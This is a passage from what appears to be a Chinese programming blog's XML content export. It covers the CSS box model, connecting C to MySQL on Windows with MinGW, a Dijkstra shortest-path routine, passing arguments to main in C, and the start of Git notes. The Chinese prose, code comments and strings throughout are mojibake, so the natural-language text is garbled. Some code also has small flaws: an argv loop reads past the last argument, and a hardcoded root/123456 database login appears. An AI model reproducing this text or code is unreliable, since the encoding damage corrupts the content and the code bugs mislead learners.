class="number">300px</span>;</span><br><span class="line">            <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h2 id="ç›’å­æ¨¡å‹"><a href="#ç›’å­æ¨¡å‹" class="headerlink" title="ç›’å­æ¨¡å‹"></a>ç›’å­æ¨¡å‹</h2><ul>
<li>ç½‘é¡µè®¾è®¡ä¸­å¸¸å¬çš„å±æ€§åï¼šmargin(å¤–è¾¹è·)ã€ border(è¾¹æ¡†)ã€ padding(å†…è¾¹è·)ã€content(å†…å®¹) ï¼ŒCSSç›’å­æ¨¡å¼éƒ½å…·å¤‡è¿™äº›å±æ€§ã€‚</li>
<li>æ‰€æœ‰HTMLå…ƒç´ å¯ä»¥çœ‹ä½œç›’å­ï¼Œåœ¨CSSä¸­ï¼Œâ€box modelâ€è¿™ä¸€æœ¯è¯­æ˜¯ç”¨æ¥è®¾è®¡å’Œå¸ƒå±€æ—¶ä½¿ç”¨ã€‚ </li>
</ul>
<p>ä¸‹é¢ç»™å‡ºå›¾è§£</p>
<img src="/2020/03/08/CSS-%E8%AF%AD%E6%B3%95%E4%BA%8C/box-model.png" class>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-class">.class_test</span>&#123;</span><br><span class="line">        <span class="comment">/* ä¾æ¬¡å®šä¹‰è¾¹æ¡†çš„ç²—ç»†ã€æ ·å¼ã€é¢œè‰² */</span></span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line">        <span class="comment">/* è¾¹æ¡†è·ç¦»å‘¨å›´å…ƒç´ çš„ä¸Šè¾¹è· */</span></span><br><span class="line">        <span class="attribute">margin-top</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="comment">/* å†…å®¹åˆ°è¾¹æ¡†çš„ä¸Šè¾¹è· */</span></span><br><span class="line">        <span class="attribute">padding-top</span>: <span class="number">20px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WebåŸºç¡€</category>
      </categories>
      <tags>
        <tag>CSSåŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>Windowsç³»ç»Ÿä¸‹Cè¯­è¨€è¿æ¥MySQL</title>
    <url>/2020/07/03/C%E8%AF%AD%E8%A8%80%E8%BF%9E%E6%8E%A5MySQL/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é«˜çº§è¯­è¨€è¿æ¥æ•°æ®åº“æŠ€æœ¯å¯è°“ååˆ†æˆç†Ÿï¼Œä½†æ˜¯ä½¿ç”¨Cè¯­è¨€è¿æ¥æ•°æ®åº“è¿˜æ˜¯æŒºå°‘çš„ï¼Œä¹‹å‰åšæ•°æ®åº“è¯¾ç¨‹è®¾è®¡çš„æ—¶å€™åˆšå¥½ç”¨åˆ°Cè¯­è¨€è¿æ¥æ•°æ®åº“ï¼Œå› æ­¤å°±æŠŠè¿™æ¬¡è¿‡ç¨‹è®°å½•ä¸‹æ¥ã€‚<a id="more"></a></p>
<h2 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h2><ol>
<li>MySQL 5.6.48-64ä½</li>
<li>MinGW64 <ul>
<li>==å‡å¦‚ä½ å®‰è£…çš„MySQLæ˜¯32ä½çš„ï¼Œé‚£ä¹ˆMinGWå°±éœ€è¦å®‰è£…32ä½ç‰ˆæœ¬çš„==</li>
</ul>
</li>
</ol>
<ul>
<li>Visual Studio Codeï¼ˆå…¶ä»–ç¼–è¾‘å™¨ä¹Ÿå¯ä»¥ï¼Œæœ‰æ¡ä»¶çš„å¯ä»¥ç”¨è®°äº‹æœ¬ï¼‰</li>
</ul>
<h2 id="å¼€å§‹æ­å»ºç¯å¢ƒ"><a href="#å¼€å§‹æ­å»ºç¯å¢ƒ" class="headerlink" title="å¼€å§‹æ­å»ºç¯å¢ƒ"></a>å¼€å§‹æ­å»ºç¯å¢ƒ</h2><ul>
<li><p>é…ç½®<code>MinGW64</code>ç¯å¢ƒ:</p>
<ul>
<li><p><a href="http://mingw.org/" target="_blank" rel="noopener">å®˜ç½‘ä¸‹è½½</a>æˆ–è€…<a href="https://q.yalexin.top/MinGW64.zip" target="_blank" rel="noopener">ç‚¹æ­¤ä¸‹è½½</a></p>
</li>
<li><p>å‡å¦‚æ˜¯ä»è¿™é‡Œä¸‹è½½çš„ï¼Œå°†å‹ç¼©æ–‡ä»¶è§£å‹åˆ°è‡ªå®šä¹‰ä½ç½®ï¼Œè®°ä½è¯¥ä½ç½®</p>
</li>
<li><p>ä¾æ¬¡ç‚¹å‡»â€œæ­¤ç”µè„‘â€ï¼Œâ€œå±æ€§â€ï¼Œâ€œé«˜çº§ç³»ç»Ÿè®¾ç½®â€ï¼Œâ€œç¯å¢ƒå˜é‡â€ï¼Œåœ¨ç³»ç»Ÿå˜é‡ä¸­æ‰¾åˆ°<code>Path</code>ï¼Œå¢åŠ ä¸€æ¡è®°å½•ï¼Œè®°å½•å€¼æ˜¯<code>MinGW64</code>å®‰è£…è·¯å¾„ä¸‹çš„<code>bin</code>æ–‡ä»¶å¤¹</p>
<p><img src="https://q.yalexin.top/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%9B%BE.png" alt></p>
</li>
<li><p>åœ¨ç»ˆç«¯è¾“å…¥<code>gcc</code>æ—¶å‡å¦‚è¾“å‡ºä¸‹é¢çš„è¯­å¥å°±è¯´æ˜é…ç½®å¥½äº†</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc: fatal error: no input files</span><br><span class="line">compilation terminated.</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>é¡¹ç›®ä¸­å¼•å…¥åº“æ–‡ä»¶</p>
<ul>
<li><p>æ‰€åœ¨é¡¹ç›®å¤„æ–°å»ºæ–‡ä»¶å¤¹<code>lib</code>ï¼Œåœ¨<code>MySQL</code>çš„å®‰è£…ç›®å½•ä¸‹çš„<code>lib</code>æ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ°<code>libmysql.dll</code>æ–‡ä»¶ï¼ˆæˆ‘çš„æ˜¯åœ¨<code>C:\Program Files\MySQL\MySQL Server 5.6\lib</code>æ–‡ä»¶å¤¹ä¸‹ï¼‰ï¼Œå°†è¯¥æ–‡ä»¶å¤åˆ¶åˆ°åˆšåˆšæ–°å»ºçš„<code>lib</code>æ–‡ä»¶å¤¹ä¸­</p>
</li>
<li><p>åœ¨ç¨‹åºä¸­åŠ å…¥å¤´æ–‡ä»¶ï¼š</p>
<ul>
<li><code>#include &lt;C:\Program Files\MySQL\MySQL Server 5.6\include\mysql.h&gt;</code>ï¼ˆè¯¥è·¯å¾„è‡ªå·±æ ¹æ®è‡ªå·±çš„æƒ…å†µè¿›è¡Œç›¸åº”æ›´æ”¹ï¼‰</li>
<li><code>#include &lt;winsock.h&gt;</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>ä¾‹å¦‚æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“<code>test</code>ï¼Œæˆ‘è¦è®¿é—®çš„æ˜¯<code>stu</code>è¡¨ï¼š</p>
<p>åœ¨é¡¹ç›®ä½ç½®æ–°å»º<code>main.c</code>æ–‡ä»¶ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-07-03 14:17:45</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-07-03 14:53:58</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\DatabaseConnect\main.c</span></span><br><span class="line"><span class="comment"> * @ç¥ˆç¥·ä¸å‡ºç°BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;C:\Program Files\MySQL\MySQL Server 5.6\include\mysql.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOST <span class="meta-string">"localhost"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 3306</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DBNAME <span class="meta-string">"test"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLENAME <span class="meta-string">"stu"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USERNAME <span class="meta-string">"root"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASW <span class="meta-string">"123456"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MYSQL mysql;</span><br><span class="line">    MYSQL_ROW row;</span><br><span class="line">    MYSQL_RES *res = (MYSQL_RES *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MYSQL_RES));</span><br><span class="line">    mysql_init(&amp;mysql);</span><br><span class="line">    <span class="keyword">if</span> (mysql_real_connect(&amp;mysql, HOST, USERNAME, PASW, DBNAME, PORT, <span class="literal">NULL</span>,</span><br><span class="line">                           CLIENT_FOUND_ROWS)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ok!\n"</span>);</span><br><span class="line">        <span class="keyword">char</span> sql[<span class="number">50</span>] = <span class="string">""</span>;</span><br><span class="line">        <span class="comment">// å‘ŠçŸ¥æ­¤æ¬¡æ˜¯gbk</span></span><br><span class="line">        mysql_set_character_set(&amp;mysql, <span class="string">"gbk"</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(sql, <span class="string">"SELECT * FROM %s"</span>, TABLENAME);</span><br><span class="line">        <span class="keyword">if</span> (mysql_real_query(&amp;mysql, sql, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="built_in">strlen</span>(sql))) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"æŸ¥è¯¢å¤±è´¥,é”™è¯¯ä¿¡æ¯ï¼š%s"</span>, mysql_error(&amp;mysql));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res = mysql_store_result(&amp;mysql);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"|%-10s|%-10s|\n\n"</span>, <span class="string">"å­¦å·"</span>, <span class="string">"å§“å"</span>);</span><br><span class="line">            <span class="keyword">while</span> ((row = mysql_fetch_row(res)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"|%-10s|%-10s|\n\n"</span>, row[<span class="number">0</span>], row[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            mysql_free_result(res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å…³é—­è¿æ¥ï¼Œé¿å…æµªè´¹èµ„æº</span></span><br><span class="line">        mysql_close(&amp;mysql);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ç™»å½•å¤±è´¥ï¼é”™è¯¯åŸå› ï¼š%s\næ˜¯å¦é€€å‡ºï¼š0ï¼šæ˜¯ï¼Œå…¶ä»–ï¼šå¦ã€‚\n"</span>,</span><br><span class="line">               mysql_error(&amp;mysql));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨å‘½ä»¤è¡Œè¿›è¡Œç¼–è¯‘ï¼Œè¿›å…¥è¯¥é¡¹ç›®ä½ç½®ï¼Œæ‰“å¼€å‘½ä»¤ç»ˆç«¯ï¼Œè¾“å…¥ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -Iinclude -Llib main.c -llibmysql -o main</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¶³å¤Ÿå¹¸è¿çš„è¯å°±ä¼šäº§ç”Ÿ<code>main.exe</code>æ–‡ä»¶ï¼Œè¿è¡Œè¯¥æ–‡ä»¶ï¼Œè¾“å‡ºï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ok!</span><br><span class="line">|å­¦å·      |å§“å      |</span><br><span class="line"></span><br><span class="line">|1         |å¼ ä¸‰      |</span><br><span class="line"></span><br><span class="line">|2         |æå››      |</span><br><span class="line"></span><br><span class="line">|3         |ç‹äº”      |</span><br></pre></td></tr></table></figure>

<h2 id="å¯èƒ½é‡åˆ°çš„é—®é¢˜"><a href="#å¯èƒ½é‡åˆ°çš„é—®é¢˜" class="headerlink" title="å¯èƒ½é‡åˆ°çš„é—®é¢˜"></a>å¯èƒ½é‡åˆ°çš„é—®é¢˜</h2><ol>
<li><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">error: unknown type name 'SOCKET'</span><br><span class="line"><span class="meta"> #</span><span class="bash">define my_socket SOCKET</span></span><br></pre></td></tr></table></figure>

<p>åŠ å…¥å¤´æ–‡ä»¶çš„é¡ºåºä¸­ï¼Œ<code>#include &lt;winsock.h&gt;</code>éœ€è¦åœ¨<code>#include &lt;C:\Program Files\MySQL\MySQL Server 5.6\include\mysql.h&gt;</code>ä¸Šé¢</p>
</li>
<li><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">File format not recognized collect2.exe: error: ld returned 1 exit status</span><br></pre></td></tr></table></figure>

<p>ä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºå®‰è£…çš„<code>MySQL</code>æ˜¯64ä½ï¼Œè€Œç¼–è¯‘å™¨<code>MinGw</code>æ˜¯32ä½é€ æˆçš„ï¼Œæˆ‘å°è¯•ç”¨32ä½è¿›è¡Œç¼–è¯‘çš„æ—¶å€™ä¼šå‡ºç°ä¸Šé¢çš„é”™è¯¯ï¼Œæ¢äº†64ä½çš„å°±ä¸ä¼šå‡ºç°é—®é¢˜äº†ã€‚</p>
</li>
</ol>
]]></content>
      <categories>
        <category>æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>æ•°æ®åº“</tag>
      </tags>
  </entry>
  <entry>
    <title>Dijkstraç®—æ³•æ±‚æœ€çŸ­è·¯</title>
    <url>/2020/10/19/Dijkstra%E7%AE%97%E6%B3%95%E6%B1%82%E6%9C%80%E7%9F%AD%E8%B7%AF/</url>
    <content><![CDATA[<p><code>Dijkstra</code>ç®—æ³•å’Œ<code>Prim</code>ç®—æ³•å…·æœ‰æå…¶ç›¸ä¼¼çš„åœ°æ–¹ï¼ŒäºŒè€…éƒ½æ˜¯æ„å»ºä¸¤ä¸ªé›†åˆï¼Œåˆ©ç”¨è´ªå¿ƒç®—æ³•ï¼Œå°†å…¶ä¸­ä¸€ä¸ªé›†åˆä¸æ–­è¿›è¡Œæ‰©å……ï¼Œæœ€ç»ˆæ±‚å¾—æœ€ä¼˜è§£ã€‚<a id="more"></a></p>
<h2 id="ç®—æ³•å®ç°"><a href="#ç®—æ³•å®ç°" class="headerlink" title="ç®—æ³•å®ç°"></a>ç®—æ³•å®ç°</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x7ffffff</span></span><br><span class="line"><span class="keyword">int</span> adj[MAXN + <span class="number">1</span>][MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> distance[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> minD[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">bool</span> visited[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> t, n;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dijkstra</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> u, minDistance;</span><br><span class="line">    minD[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    visited[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++) minD[i] = adj[i][<span class="number">1</span>] != <span class="number">0</span> ? adj[i][<span class="number">1</span>] : INF;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        u = <span class="number">-1</span>, minDistance = INF;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!visited[j] &amp;&amp; minDistance &gt; minD[j]) &#123;</span><br><span class="line">                u = j;</span><br><span class="line">                minDistance = minD[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[u] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœ j æ²¡æœ‰è¢«è®¿é—®è¿‡ä¸” j å’Œ u ä¹‹é—´è”é€š å¹¶ä¸” j é€šè¿‡ u å¯ä»¥ç¼©çŸ­ j åˆ°å·²è¢«è®¿é—®çš„ç‚¹é›†ä¹‹é—´çš„è·ç¦»</span></span><br><span class="line">            <span class="keyword">if</span> (!visited[j] &amp;&amp; adj[j][u] != <span class="number">0</span> &amp;&amp;</span><br><span class="line">                minD[j] &gt; minDistance + adj[j][u]) &#123;</span><br><span class="line">                minD[j] = minDistance + adj[j][u];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">printf</span>(<span class="string">"%d "</span>, minD[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>æœ€çŸ­è·¯</tag>
        <tag>C</tag>
        <tag>è´ªå¿ƒç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title>Cè¯­è¨€å‘mainå‡½æ•°ä¼ é€’å‚æ•°</title>
    <url>/2020/04/02/C%E8%AF%AD%E8%A8%80%E5%90%91main%E5%87%BD%E6%95%B0%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0/</url>
    <content><![CDATA[<p>æˆ‘ä»¬ä¸€èˆ¬å†™Cè¯­è¨€çš„ä»£ç çš„æ—¶å€™ï¼Œ<code>main</code>å‡½æ•°æ˜¯ä¸å¸¦å½¢å‚çš„ï¼Œå¦‚<a id="more"></a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description: </span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-04-02 11:16:47</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-02 12:44:54</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å…¶å®æˆ‘ä»¬æ˜¯å¯ä»¥å‘<code>main</code>å‡½æ•°ä¼ é€’å‚æ•°çš„ï¼Œåªä¸è¿‡æ­¤æ—¶æˆ‘ä»¬éœ€è¦åœ¨å‘½ä»¤è¡Œä¸­è¿›è¡Œç¼–è¯‘è¿è¡Œï¼Œä¾‹å¦‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-04-02 11:16:47</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-04-02 12:52:16</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> arc, <span class="keyword">char</span>* input[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"æ‚¨è¾“å…¥äº†%dä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯ï¼š\n"</span>, arc);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= arc; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, input[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨å‘½ä»¤è¡Œä¸­ï¼Œè¿›å…¥åˆ°ç¨‹åºæ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸‹ï¼Œè¾“å…¥ç¼–è¯‘å‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./test å‚æ•°ä¸€ å‚æ•°äºŒ å‚æ•°ä¸‰</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">æ‚¨è¾“å…¥äº†4ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯ï¼š</span><br><span class="line">D:\my_c_workspace\some_test\test.exe</span><br><span class="line">å‚æ•°ä¸€</span><br><span class="line">å‚æ•°äºŒ</span><br><span class="line">å‚æ•°ä¸‰</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°ç¬¬ä¸€ä¸ªå‚æ•°å®é™…ä¸Šæ˜¯å‘½ä»¤æœ¬èº«ï¼ˆè™½ç„¶è¯´å®ƒçš„ä¸‹æ ‡æ˜¯0ï¼‰ï¼</p>
<p>æˆ‘ä»¬å¯ä»¥å€ŸåŠ©ä¸Šé¢çš„æ–¹æ³•ç»™<code>main</code>å‡½æ•°è¿›è¡Œä¼ é€’å‚æ•°ï¼Œæ¥ç€è¿›è¡Œç±»å‹è½¬æ¢å°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ç±»å‹ã€‚</p>
]]></content>
      <categories>
        <category>å‘½ä»¤è¡Œ</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitå­¦ä¹ ç¬”è®°ä¹‹Gitçš„åˆä½“éªŒ</title>
    <url>/2022/02/08/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BGit%E7%9A%84%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¯´å®è¯ï¼Œæˆ‘ä¹‹å‰è™½ç„¶ç»å¸¸æ¥è§¦å’Œä½¿ç”¨<code>Git</code>ï¼Œä½†æ˜¯å®é™…ä¸Šä¹Ÿåªæ˜¯ç»å¸¸ä½¿ç”¨<code>Git</code>çš„<code>add ã€commitã€push</code>åŠŸèƒ½ï¼Œå…¶ä»–çš„åŸºæœ¬æ²¡æ€ä¹ˆæ¥è§¦è¿‡ï¼Œç®—æ˜¯æŸç§æ„ä¹‰ä¸Šçš„é›¶åŸºç¡€ã€‚åœ¨å›¢é˜Ÿåä½œçš„èƒŒæ™¯ä¸‹ï¼Œç‰ˆæœ¬æ§åˆ¶æ˜¯ä¸€ä¸ªç®€åŒ–é˜Ÿå‘˜åˆä½œã€æé«˜æ•ˆç‡çš„ç»•ä¸å¼€çš„éš¾é¢˜ï¼Œå› æ­¤æˆ‘è§‰å¾—ååˆ†æœ‰å¿…è¦å­¦ä¸€ä¸‹<code>Git</code>å·¥å…·ï¼Œå½“ç„¶äº†è¿™ä¸ªå·¥å…·å¾ˆå¼ºå¤§ï¼Œå¾ˆå¤šå†…å®¹å¾€æ·±äº†å¾ˆéš¾æŒæ¡ï¼Œå¤§å¤šæ•°äººä¹Ÿä¸€èˆ¬ç”¨ä¸åˆ°ï¼Œå› æ­¤è¿™éƒ¨åˆ†æˆ‘æ‰“ç®—ä¸å­¦ï¼Œä»¥åéœ€è¦ç”¨å¾—åˆ°äº†å†å»ç¿»ç¿»æ–‡æ¡£åº”è¯¥ä¹Ÿè¿˜æ¥å¾—åŠã€‚</p>
<a id="more"></a>

<h2 id="Gitç®€ä»‹"><a href="#Gitç®€ä»‹" class="headerlink" title="Gitç®€ä»‹"></a>Gitç®€ä»‹</h2><p>ä»‹ç»Gitä¹‹å‰ï¼Œé¦–å…ˆå°±è¦å…ˆæ˜ç™½ä»€ä¹ˆå«<strong>ç‰ˆæœ¬æ§åˆ¶</strong></p>
<blockquote>
<p>ç‰ˆæœ¬æ§åˆ¶æ˜¯æŒ‡å¯¹è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­å„ç§ç¨‹åºä»£ç ã€é…ç½®æ–‡ä»¶åŠè¯´æ˜æ–‡æ¡£ç­‰æ–‡ä»¶å˜æ›´çš„ç®¡ç†ï¼Œæ˜¯è½¯ä»¶é…ç½®ç®¡ç†çš„æ ¸å¿ƒæ€æƒ³ä¹‹ä¸€ã€‚</p>
</blockquote>
<p>ç®€è€Œè¨€ä¹‹å°±æ˜¯è®°å½•è¿½è¸ªæ–‡ä»¶çš„å˜æ›´ï¼ŒåŒ…æ‹¬ä½•äººä½•æ—¶ä¿®æ”¹äº†ä½•æ–‡ä»¶ï¼Œä»¥åŠä¿®æ”¹æˆäº†ä»€ä¹ˆå†…å®¹ï¼Œå¹¶åœ¨é€‚å½“çš„æ—¶å€™æ‰“ä¸Šæ ‡è®°ï¼Œæ–¹ä¾¿ä»¥åå›æ»šï¼Œç»å¸¸ç©æ¸¸æˆçš„æœ‹å‹ä»¬ä¸€å®šå¯¹æ¸¸æˆé‡Œçš„å­˜æ¡£ï¼Œåœ¨æ¸¸æˆé€‚å½“çš„æ—¶å€™å­˜ä¸ªæ¡£ï¼Œåœ¨æ¸¸æˆä¸­æˆ‘ä»¬å°±å¯ä»¥æ–¹ä¾¿åœ¨ä»»æ„ä¸€ä¸ªå­˜æ¡£ç‚¹åˆ‡æ¢ã€‚</p>
<p>å½“ç„¶äº†ï¼Œç‰ˆæœ¬æ§åˆ¶çš„åŠŸèƒ½ä¸ä»…ä»…å±€é™äºä¸Šé¢æ‰€è¯´çš„å†…å®¹ï¼Œç‰¹åˆ«æ˜¯é¢å¯¹å¤šäººåä½œå¼€å‘æ—¶ï¼Œç‰ˆæœ¬æ§åˆ¶è½¯ä»¶è¿˜å¯ä»¥æ–¹ä¾¿é˜Ÿå‘˜åˆ†å·¥ï¼Œè®°å½•é˜Ÿå‘˜å®Œæˆçš„å†…å®¹ï¼Œæ–¹ä¾¿ä»£ç åˆå¹¶ã€‚</p>
<p>ç°åœ¨å¸‚é¢ä¸Šå¸¸è§çš„ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶æœ‰å¥½å‡ ä¸ªï¼Œç”±äºæˆ‘å¹¶æ²¡æœ‰ç”¨è¿‡é™¤äº†<code>Git</code>ä»¥å¤–çš„å·¥å…·ï¼Œå› æ­¤å¯¹ä¸‹åˆ—å…¶ä»–çš„æè¿°å‡æ¥è‡ª<a href="https://www.jianshu.com/p/47f79a13524f" target="_blank" rel="noopener">ç®€ä¹¦åšä¸»</a></p>
